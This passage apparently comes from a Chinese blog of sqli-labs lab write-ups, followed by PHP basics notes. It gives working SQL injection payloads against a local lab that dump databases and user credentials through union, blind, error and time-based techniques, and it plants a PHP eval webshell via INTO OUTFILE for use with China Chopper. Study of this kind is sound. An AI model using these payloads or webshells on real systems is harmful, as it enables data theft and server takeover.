,^user返回的是true</p><p>补充知识:</p><pre><code>#回显的n行的1,n=users表中的行数select 1 from users; #id=-1是不存在的值,这个时候条件筛选的返回值是false,不会有值搜索出来select 1 from users where id =-1#id=1是存在的值,这个时候条件筛选的返回值是true,会显示一行的1select 1 from users where id =1</code></pre><p>注入的sql语句:</p><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name  regexp'^username'limit 0,1)--+</code></pre><p>拆解下面的sql语句含义:在users的表中select 1并且条件是判断columns中是否有username,如果有,则整句返回1,否则返回空</p><pre><code>select 1 from information_schema.columns where table_name='users' and column_name  regexp'^username'limit 0,1</code></pre><p>总结:对于注入的sql语句,作用就是看看猜测的列名是否正确,如果正确就返回1,此时1=1,整个sql语句返回true可以正常回显,否则无法正常回显(用脚本来试很快)</p><p>(4)利用ord（）和mid（）函数获取users表的内容</p><ul><li>ord(XX):把字母转化成ascii码</li><li>mid(str,begin,length):截取str,begin为起点,1表示第一个字符,length是截取长度  </li></ul><p>含义:</p><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((select IFNULL(username,0x20)from security.users order by id limit 0,1),1,1))=68--+#其实这样也可以,不过会不太严谨ord(mid((select  username from security.users order by id limit 0,1),1,1))=68--+</code></pre><ul><li><p>方法二(用burpsuit暴力破解) </p><p>具体方法以后再补,先跳过</p></li></ul><h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h3><p>(1)报错注入<br>语法</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token number">a</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">;</span></code></pre><p>less5的代码:  </p><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></pre><p>小结:报错注入主要改的是from处的代码,其他地方不用变,如果user表或者rand被禁用,就换图片中的写法</p><p><a href="https://imgchr.com/i/Dl1hzF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/Dl1hzF.png" alt="Dl1hzF.png"></a><br>(2)利用double数值类型超出范围进行报错注入<br><a href="https://imgchr.com/i/DllN3F" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DllN3F.png" alt=""></a></p><p>(2)利用double数值类型超出范围进行报错注入<br>语法</p><pre><code>select exp(~(select * FROM(SELECT USER())a))    //double数值类型超出范围</code></pre><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' union select  (exp((select * FROM(SELECT USER())a))),2,3--+</code></pre><p>(3)利用bigint溢出进行报错注入</p><pre><code>select !(select * from (select user())x) -（ps:这是减号） ~0</code></pre><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+</code></pre><h3 id="4-延时注入"><a href="#4-延时注入" class="headerlink" title="4.延时注入"></a>4.延时注入</h3><p>代码含义:以猜数据库名的第一个字符为例子,如果猜错了ascii码额值，就执行sleep(5),网页要等待5s才刷新,否则立刻会刷新</p><pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p><a href="https://imgchr.com/i/Dlglr9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dlglr9.png" alt="结果图"></a><br>二.less6<br>同less5 ,只不过变成双引号闭合,把’改成”即可,其他地方相同</p><h2 id="三-less7"><a href="#三-less7" class="headerlink" title="三.less7"></a>三.less7</h2><ul><li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>网页提示用out file来解决<br><a href="https://imgchr.com/i/Dl2BSU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl2BSU.png" alt=""></a></li><li>less7代码:  <pre><code>http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,'&lt;?php @eval($_POST["crow"]); ?&gt;' into outfile  'E:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php' --+</code></pre>注意点  </li><li>本关要构造’))才能形成正确闭合</li><li>把一句话木马写入Less7的文件夹下,然后再用中国菜刀等web工具打开进行入侵 </li></ul><p>中国菜刀的用法:<br>进行木马写入后,比如上面的a.php,然后右键添加,把php文件的网址路径写入,然后密码写在右侧小框里,确认后回到主页点击刚刚添加的那一项就可以进入文件夹了了<br><a href="https://imgchr.com/i/DlgBqA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgBqA.png" alt=""></a><br><a href="https://imgchr.com/i/DlgyIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgyIP.png" alt=""></a></p><h2 id="四-less8"><a href="#四-less8" class="headerlink" title="四.less8"></a>四.less8</h2><p>这里采用的是单引号闭合id=’1’,盲注手法同less5</p><p>我这里随便举一个延时注入为例</p><pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=117,1,sleep(5))--+</code></pre><h2 id="五-less9"><a href="#五-less9" class="headerlink" title="五.less9"></a>五.less9</h2><p>这一关我们先加单引号（id=1’）进行测试后发现数据页面正常回显(实际上sql语句也确实是单引号字符型),然后尝试 and sleep(5),发现页面会执行sleep函数,说明存在注入漏洞  </p><p>后面可以直接用延时注入的手法查看数据即可,方法其实同less5,但是下面我再延时一遍如何利用各个函数调取猜解信息 <strong><em>（这里是对于布尔盲注而言的,and xxx来判断xxx 返回的是true还是false）</em></strong></p><ul><li><p>1.猜解数据库名</p><pre class=" language-SQL"><code class="language-SQL">If(ascii(substr(database(),1,1))=115,1,sleep(5))</code></pre></li><li><p>2.猜测 security 的数据表：<br>用limit 控制想要猜的表</p><pre class=" language-SQL"><code class="language-SQL">If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))</code></pre></li><li><p>3.猜测表中的列名,以users表为例</p><pre class=" language-SQL"><code class="language-SQL">If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))</code></pre></li><li><p>4.猜测 username 的值：</p><pre><code>If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+</code></pre></li></ul><h1 id="六-less10"><a href="#六-less10" class="headerlink" title="六.less10"></a>六.less10</h1><p>双引号的字符型注入,后面玩法后less5一样<br><a href="https://imgchr.com/i/DlRdHA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRdHA.png" alt=""></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷sqli-labs的前置知识</title>
      <link href="/2020/11/20/shua-sqli-labs-de-qian-zhi-zhi-shi/"/>
      <url>/2020/11/20/shua-sqli-labs-de-qian-zhi-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p><strong><em>主要记录mysql注入天书中Background中的知识</em></strong></p><h2 id="一-Background-1基础知识"><a href="#一-Background-1基础知识" class="headerlink" title="一.Background-1基础知识"></a>一.Background-1基础知识</h2><p><a href="https://www.cnblogs.com/csnd/p/11807596.html这里记录了一些敏感操作的注入方法" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11807596.html这里记录了一些敏感操作的注入方法</a><br>mysql里的一些函数:<br><a href="https://imgchr.com/i/DG0Ed0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DG0Ed0.png" alt=""></a>  </p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token keyword">use</span> security<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span>；<span class="token keyword">desc</span> emails；<span class="token comment" spellcheck="true">#查看表结构</span><span class="token keyword">use</span> information_schema；</code></pre><p>Mysql有一个系统数据库information_schema，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程</p><pre class=" language-SQL"><code class="language-SQL">1.查看指定数据库中的表select table_name from information_schema.tables where table_schema="security";2.猜数据库select schema_name from information_schema.schemata3.猜某表的所有列名select column_name from information_schema.columns where table_name='XXXX'4.获取某列的内容select *** from ****</code></pre><h2 id="二-Background-2基础知识-less-5-8"><a href="#二-Background-2基础知识-less-5-8" class="headerlink" title="二.Background-2基础知识(less 5-8)"></a>二.Background-2基础知识(less 5-8)</h2><p><a href="https://imgchr.com/i/DMgAD1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMgAD1.png" alt=""></a></p><h2 id="三-Background-3基础知识"><a href="#三-Background-3基础知识" class="headerlink" title="三.Background-3基础知识"></a>三.Background-3基础知识</h2><p><a href="https://imgchr.com/i/Dl6aFK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl6aFK.jpg" alt=""></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Less 1-4</title>
      <link href="/2020/11/19/less1-5/"/>
      <url>/2020/11/19/less1-5/</url>
      
        <content type="html"><![CDATA[<h1 id="注-由于为了更方便学习-我在网页源码后面把sql语句输出出来了方便学习-实际学习的时候是要看报错自己推里的"><a href="#注-由于为了更方便学习-我在网页源码后面把sql语句输出出来了方便学习-实际学习的时候是要看报错自己推里的" class="headerlink" title="注:由于为了更方便学习,我在网页源码后面把sql语句输出出来了方便学习,实际学习的时候是要看报错自己推里的"></a>注:由于为了更方便学习,我在网页源码后面把sql语句输出出来了方便学习,实际学习的时候是要看报错自己推里的</h1><h2 id="一-less1-——-字符注入-单引号闭合"><a href="#一-less1-——-字符注入-单引号闭合" class="headerlink" title="一.less1 —— 字符注入(单引号闭合)"></a>一.less1 —— 字符注入(单引号闭合)</h2><p><a href="https://imgchr.com/i/DMFAP0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMFAP0.png" alt=""></a></p><h3 id="1-首先判断注入的类型"><a href="#1-首先判断注入的类型" class="headerlink" title="1.首先判断注入的类型:"></a>1.首先判断注入的类型:</h3><p>方法：先在后面加一个单引号 ‘  测试一下(注意别用中文单引号)</p><pre><code>127.0.0.1/sqli-labs/Less-1/?id=1'</code></pre><p>会出现报错,报错内容如下(报错说明程序员未对输入内容进行过滤)</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></pre><p>可以猜它的sql语句如下</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#原sql语句：</span><span class="token keyword">select</span> xx <span class="token keyword">from</span> xx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token comment" spellcheck="true">#注入后的sql语句变成了:</span><span class="token keyword">select</span> xx <span class="token keyword">from</span> xx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span>'<span class="token comment" spellcheck="true">#不能构成合法的sql语句会报错,可以进行字符型注入</span></code></pre><p><a href="https://imgchr.com/i/DMkykR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMkykR.png" alt=""></a></p><h3 id="2-判断完是字符型注入-想要把第三个单引号进行注释掉就能构造闭合-然后自己添加后续的sql语句"><a href="#2-判断完是字符型注入-想要把第三个单引号进行注释掉就能构造闭合-然后自己添加后续的sql语句" class="headerlink" title="2.判断完是字符型注入,想要把第三个单引号进行注释掉就能构造闭合,然后自己添加后续的sql语句"></a>2.判断完是字符型注入,想要把第三个单引号进行注释掉就能构造闭合,然后自己添加后续的sql语句</h3><p>方法：在4的后面加一个单引号 ‘, 可以构成闭合,这个时候用 –+或者#注释掉第三个单引号以及后面的内容,加号会被自动解析成空格</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=4' or 1=2 --+</code></pre><p>此时构造的sql语句</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> xx <span class="token keyword">from</span> xx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#回显的内容:</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'4'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">-- ' LIMIT 0,1</span></code></pre><h3 id="3-分析列数-为联合查询铺垫"><a href="#3-分析列数-为联合查询铺垫" class="headerlink" title="3.分析列数(为联合查询铺垫)"></a>3.分析列数(为联合查询铺垫)</h3><p>方法：order by 分析列数(二分最快)<br>这里到order by 3的时候可以正常回显,大于3的时候会报错,无法正确回显</p><pre><code>127.0.0.1/sqli-labs/Less-1/?id=4' order by 4 --+</code></pre><p><a href="https://imgchr.com/i/DMelIH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMelIH.png" alt=""></a></p><h3 id="4-进行union联合注入"><a href="#4-进行union联合注入" class="headerlink" title="4.进行union联合注入"></a>4.进行union联合注入</h3><p>补充:union联合查询的规则:将后面的表的数据插入到前面的表的后面然后一起显示(可能叙述有不太准确的地方)<br>1.先测试一下数据在哪里进行显示的:</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/id=-1'union select 100,2,3--+注意这里id是-1</code></pre><p>当把id改成-1后,这时页面显示的结果如下,原因在于主表的数据查不到然后联合的那个数据(100，2，3),如果id合法的话2和3不会显示出来<br><a href="https://imgchr.com/i/DMmJk4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMmJk4.png" alt=""></a><br>结论:经过分析可知,三列里,只有第二第三个参数能回显,第一个应该是没什么用的</p><p>为了更直观的感受上面的注入和数据库中表的关系,可以看一下下面sql语句执行的实际效果<br><a href="https://imgchr.com/i/DMmTAg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMmTAg.png" alt=""></a><br><strong><em>显然,如果id=1的话,新添的数据被加在了联合表的后面,并且第一个参数是id,确实不会正确回显,第二第三个参数是username和password</em></strong></p><hr><h4 id="进行敏感操作-1-4关都这样-主要在第一关详细讲"><a href="#进行敏感操作-1-4关都这样-主要在第一关详细讲" class="headerlink" title="进行敏感操作(1-4关都这样,主要在第一关详细讲)"></a>进行敏感操作(1-4关都这样,主要在第一关详细讲)</h4><p>当我们对数据回显位置有了了解之后,就可以在联合查询语句中进行查询敏感信息了<br>1.比如得到所有数据库的名字<br>注1:因为知道了参数对应的回显位置,所以下面让password的位置回显数据<br>注2:利用group_concat(字段名)来吧需要的字段的数据聚合到一个组然后输出</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt="结果图"></a></p><p>2.爆security数据库的数据表</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+</code></pre><p><a href="https://imgchr.com/i/DQJ8C6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQJ8C6.png" alt="结果图"></a></p><p>3.爆users表的列</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p><p>4.爆数据</p><pre><code>把id=2的username和password找出来http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,username,password from users where id=2 --+</code></pre><p>对应的sql语句是</p><pre class=" language-SQL"><code class="language-SQL">SELECT*FROM users WHERE id='-1' UNION SELECT 1,username,PASSWORD FROM users WHERE id=2 </code></pre><p><a href="https://imgchr.com/i/DQr9AS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQr9AS.png" alt="结果图"></a></p><p>在sqlyog中的展示:<br><a href="https://imgchr.com/i/DQDI0K" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQDI0K.png" alt=""></a></p><hr><h2 id="二-less2-——-整型注入"><a href="#二-less2-——-整型注入" class="headerlink" title="二.less2 —— 整型注入"></a>二.less2 —— 整型注入</h2><p><strong><em>less2和less1的步骤差不多,下面省略不写了,只写主要部分</em></strong><br>分析:<br>当id等于1的时候可以正常回显</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1</code></pre><h3 id="1-首先判断注入类型"><a href="#1-首先判断注入类型" class="headerlink" title="1.首先判断注入类型"></a>1.首先判断注入类型</h3><p>报错内容(<strong><em>这里的报错和less1中的是不一样的</em></strong>)： </p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1</code></pre><p><a href="https://imgchr.com/i/DMtebj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMtebj.png" alt="DMtebj.png"></a></p><p>可以猜测到它的sql语句是 </p><pre class=" language-SQL"><code class="language-SQL">#原sql语句是:select xx from xx where id=xx#注入后的sql语句是select xx from xx where id=xx'#不符合sql语法格式不能正常回显</code></pre><h3 id="2-分析列数-为联合查询铺垫"><a href="#2-分析列数-为联合查询铺垫" class="headerlink" title="2.分析列数(为联合查询铺垫)"></a>2.分析列数(为联合查询铺垫)</h3><p>同less1 ,order by 3 为最大值 </p><h3 id="3-进行union联合注入"><a href="#3-进行union联合注入" class="headerlink" title="3.进行union联合注入"></a>3.进行union联合注入</h3><p>由于整型注入就不用考虑闭合的问题了</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3</code></pre><p><a href="https://imgchr.com/i/DMNH1K" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMNH1K.png" alt=""></a></p><hr><h2 id="三-less3-——-字符注入-单引号-括号闭合"><a href="#三-less3-——-字符注入-单引号-括号闭合" class="headerlink" title="三.less3 —— 字符注入(单引号+括号闭合)"></a>三.less3 —— 字符注入(单引号+括号闭合)</h2><p>1.测试注入类型<br>后面加 id=1’,出现如下报错。后面加 id=1”可以正常回显<br>报错内容:</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1</code></pre><p><a href="https://imgchr.com/i/DMUkng" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMUkng.png" alt=""></a><br>说明是字符型注入<br>猜测可以猜测到它的sql语句是 </p><pre class=" language-SQL"><code class="language-SQL">原sql语句是:select xx from xx where id=('xx')#注入后的sql语句是:select xx from xx where id=('xx'')#不符合sql语法</code></pre><h3 id="2-分析列数-为联合查询铺垫-1"><a href="#2-分析列数-为联合查询铺垫-1" class="headerlink" title="2.分析列数(为联合查询铺垫)"></a>2.分析列数(为联合查询铺垫)</h3><p>同less1 ,order by 3 为最大值 </p><h3 id="3-进行union联合注入-1"><a href="#3-进行union联合注入-1" class="headerlink" title="3.进行union联合注入"></a>3.进行union联合注入</h3><p>分析:对于(‘xx’),我们可以通过注释掉后半部分 ‘) ,然后进行手动构造闭合</p><pre><code>http://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,2,3--+</code></pre><p>此时构成的sql语句是:</p><pre class=" language-SQL"><code class="language-SQL">select xx from xx where id=('1') union select 1,2,3 --+') </code></pre><p>这样就实现手动构造 ‘)并且在外面加了联合注入<br><a href="https://imgchr.com/i/DMUkng" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMUkng.png" alt="效果图"></a></p><hr><h2 id="四-less4-——-字符注入-双引号-括号闭合"><a href="#四-less4-——-字符注入-双引号-括号闭合" class="headerlink" title="四.less4 —— 字符注入(双引号+括号闭合)"></a>四.less4 —— 字符注入(双引号+括号闭合)</h2><h3 id="1-测试注入类型"><a href="#1-测试注入类型" class="headerlink" title="1.测试注入类型"></a>1.测试注入类型</h3><p>后面加 id=1”,出现如下报错。后面加 id=1’可以正常回显<br>报错内容(注意看和less3的报错区别)</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1</code></pre><p><a href="https://imgchr.com/i/DM0beU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DM0beU.png" alt=""></a><br>说明是字符型注入<br>猜测可以猜测到它的sql语句是 </p><pre class=" language-SQL"><code class="language-SQL">原sql语句是:select xx from xx where id=("xx")#注入后的sql语句是:select xx from xx where id=("xx"")#不符合sql语法</code></pre><h3 id="2-分析列数-为联合查询铺垫-2"><a href="#2-分析列数-为联合查询铺垫-2" class="headerlink" title="2.分析列数(为联合查询铺垫)"></a>2.分析列数(为联合查询铺垫)</h3><p>同less1 ,order by 3 为最大值 </p><h3 id="3-进行union联合注入-2"><a href="#3-进行union联合注入-2" class="headerlink" title="3.进行union联合注入"></a>3.进行union联合注入</h3><p>分析:构造闭合的方式同 less3,知识单引号变成双引号而已  </p><p>构造方式:</p><pre><code>http://127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,2,3 --+</code></pre><p><a href="https://imgchr.com/i/DMDABT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMDABT.png" alt=""></a></p><h2 id="五-总结"><a href="#五-总结" class="headerlink" title="五.总结"></a>五.总结</h2><p>SQL注入基础-判断闭合形式</p><pre><code>SELECT * FROM `users` WHERE id= 1;#整形闭合SELECT * FROM `users` WHERE id='1'; #单引号闭合SELECT * FROM `users` WHERE id="1";#双引号闭合SELECT * FROM `users` WHERE id=('1');#单引号加括号SELECT * FROM `users` WHERE id=("1");#双引号加括号</code></pre><p>步骤：</p><ul><li>1.注意看上面的报错内容,通过报错内容推里原sql语句的形式</li><li>2.用order by 分析列数</li><li>3.思考闭合的形式然后使用联合注入进行信息提取</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基础笔记</title>
      <link href="/2020/11/18/php-ji-chu-bi-ji/"/>
      <url>/2020/11/18/php-ji-chu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面:"></a>写在前面:</h1><p>PHP语句分隔符：<br>1、在PHP中，代码以行为单位，系统需要通过判断行的结束，通常都用；表示结束。<br>注注注：PHP中标记结束符?&gt;有自带语句结束符的效果，最后一行PHP代码可以没有语句结束符。<br>2、PHP中代码的书写并不是全嵌入到HTML中，而是单独存在，所以可以不用标记结束符?&gt;</p><h1 id="一-变量与常量"><a href="#一-变量与常量" class="headerlink" title="一.变量与常量"></a>一.变量与常量</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>1.变量名字必须以”$”开头；</p><p>2.删除变量：unset($var2)</p><p>3.预定义变量<br>即提前定义的变量，由系统定义的变量，存储许多要用到的数据（预定义变量都是数组）</p><p>4.变量传值<br>如果一个变量保存的值刚好是另外一个变量的名字，则可直接通过访问一个变量得到另外一个变量的<br>值：但需在变量前多加一个$符号</p><pre class=" language-SQL"><code class="language-SQL">$a = 'b'; // a变量的内容正好是b变量的名称，故称a为可变变量$b = 'bb';echo $$a; // 使用时需加一个$符号</code></pre><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>系统常量<br>魔术常量：由双下划线+常量名+双下划线组成，其值会随着环境变化而变化，用户无法改变。</p><pre class=" language-PHP"><code class="language-PHP">$a = 'b'; // a变量的内容正好是b变量的名称，故称a为可变变量$b = 'bb';echo $$a; // 使用时需加一个$符号</code></pre><h1 id="二-常量"><a href="#二-常量" class="headerlink" title="二.常量"></a>二.常量</h1><pre class=" language-PHP"><code class="language-PHP"><?php// 使用函数定义常量define('PI',3.1415); // 注意此处与c++不同，#define 为预处理命令，宏定义，无需加；。。// 使用const关键字定义const PI1 = 3;// 定义特殊常量define('^-^','smile');// const ^-^ // 报错// 访问常量echo PI1;// echo ^-^ // 报错constant('^-^'); // 特殊常量的访问// 系统常量echo '<hr/>',PHP_VERSION,'<br/>',PHP_INI_SIZE,'<br/>',PHP_INI_MAX; // 有符号整形// 魔术常量echo '<hr/>',__DIR__,'<br/>',__FILE__,'<br/>',__LINE__;echo __LINE__; // 输出的行数会变</code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><a href="https://imgchr.com/i/DnoYmd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/18/DnoYmd.png" alt="数据类型"></a></p><h2 id="数据转换方式"><a href="#数据转换方式" class="headerlink" title="数据转换方式"></a>数据转换方式</h2><p>1、自动转化：系统根据自己的需求判断，自己转化（用的较多、但效率较低）。  </p><p>强制转换（手动）：在变量之前增加一个()，并在括号里面写上对于的类型，其中NULL特殊，需用<br>unset。  </p><p><strong><em>转换说明：</em></strong></p><ul><li>1、以字母开头的字符串，永远为0；</li><li>2、以数字开头的字符串，取到碰到字符串为止。（不会同时包含两个小数点）</li></ul><p><strong><em>注: var_dump 输出展示展示代码内容，结构与类型。该函数作可以窥探所有内容的类型，以及内部信息</em></strong><br>案例:</p><pre class=" language-PHP"><code class="language-PHP"><?php// 数据类型// 创建数据$a = 'abcd1.1.1';$b = '1.1.1abc';// 自动转换。算术运算，系统先转化为数值类型，然后运算echo $a+$b; // 结果为1.1（0+1.1）// 强制转换echo '<br/>',(float)$a,(float)$b; // 01.1// 类型判断echo '<hr/>';var_dump(is_int($a)); // bool(FALSE)var_dump(is_string($a)); // bool(TRUE)// 获取数据类型echo '<hr/>';echo gettype($a); // string（虽然前面强制转换了，但并未改变本身）// 设置类型var_dump(settype($b,'int')); // 先将字符串转换为int型，转换成功返回true，var_dump判断是否为bool型，故显示 bool（true）echo gettype($b),$b; // interger1</code></pre><h3 id="进制转换api"><a href="#进制转换api" class="headerlink" title="进制转换api"></a>进制转换api</h3><ul><li>Decbin():十进制转二进制</li><li>Decoct():十进制转八进制</li><li>Dechex():十进制转十六进制</li><li>Bindec():二进制转十进制</li></ul><h1 id="三-运算符"><a href="#三-运算符" class="headerlink" title="三.运算符"></a>三.运算符</h1><p>php其他的运算符和C都一样,重点看一下比较运算符<br>注:全等于和不全等是是要考虑数据类型的<br><a href="https://imgchr.com/i/Dn7CxU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/18/Dn7CxU.png" alt="比较运算符"></a></p><pre class=" language-PHP"><code class="language-PHP">$a = '123'; // 字符串$b = 123; // 整型var_dump($a == $b); // 结果： bool(true)var_dump($a === $b); // 结果： bool(false) 不全等于// 连接运算符 .(将字符串连接一起) .=(将左边内容与右边内容连接起来并重新赋值)$e = 'hello';$f = 123;echo $e . $f; // hello 123（注意，此处有强制类型转换）$e .= $e;echo $e; // hello 123// 